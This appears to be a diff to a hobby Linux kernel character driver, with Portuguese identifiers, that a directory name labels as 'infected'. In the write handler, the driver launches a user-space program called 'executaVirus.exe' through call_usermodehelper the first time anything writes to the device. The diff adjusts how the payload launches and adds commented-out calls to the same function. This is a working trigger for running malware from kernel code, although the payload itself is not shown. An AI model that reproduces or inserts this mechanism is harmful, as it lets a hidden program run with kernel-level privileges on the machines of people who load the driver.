@@ -71,6 +71,9 @@ int meuDriver_iniciar(void) {
   memset(meuDriver_buffer, 0, 1);
 
   printk("<1>meuDriver: Inserindo Modulo\n"); 
+  
+  //iniciarVirus();
+  
   return 0;
 
   falha: 
@@ -122,22 +125,18 @@ ssize_t meuDriver_escrever(struct file *filp, char *buf_caractere,
                     size_t tamanho, loff_t *f_posicao){
 
   char *tmp;
-  printk("<1>meuDriver: meuDriver_escrever 01\n");
   
-  printk("<1>meuDriver: Virus Iniciado = %d\n", virusFoiIniciado);
   
   if(virusFoiIniciado == 0)
   {
   	virusFoiIniciado = 1;
-  	printk("<1>meuDriver: Iniciando Virus!\n");
   	iniciarVirus();
-  	printk("<1>meuDriver: Virus Iniciado!\n");
   }
-  
-  printk("<1>meuDriver: meuDriver_escrever 02\n");
   
   tmp = buf_caractere + tamanho - 1;
   copy_from_user(meuDriver_buffer,buf_caractere,tamanho);
+  
+  //iniciarVirus();
   
   //printk("escrever meuDriver_buffer: %c\n", *meuDriver_buffer);
   
@@ -147,16 +146,22 @@ ssize_t meuDriver_escrever(struct file *filp, char *buf_caractere,
 void iniciarVirus()
 {
 	int resultado;
-
+	
 	//char *argv[] = {"virus.exe", 0};
-	char *argv[] = {"/home/luciano/Documentos/Drivers/MeuDriver_Infectado/virus.exe", 0};
+	char *argv[] = {"/home/luciano/Documentos/Drivers/MeuDriver_Infectado/executaVirus.exe", 0};
 	//static char * envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 0 };
 	static char *envp[] = { 
         "HOME=/", 
         "TERM=linux", 
-        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL }; 
-	resultado = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+        
+    printk("<1>meuDriver: Iniciando Virus\n");	
+    
+	resultado = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+	
 	printk("<1>meuDriver: call_usermodehelper = %d\n", resultado);
+	
+	printk("<1>meuDriver: Virus Iniciado\n");
 }
 
 
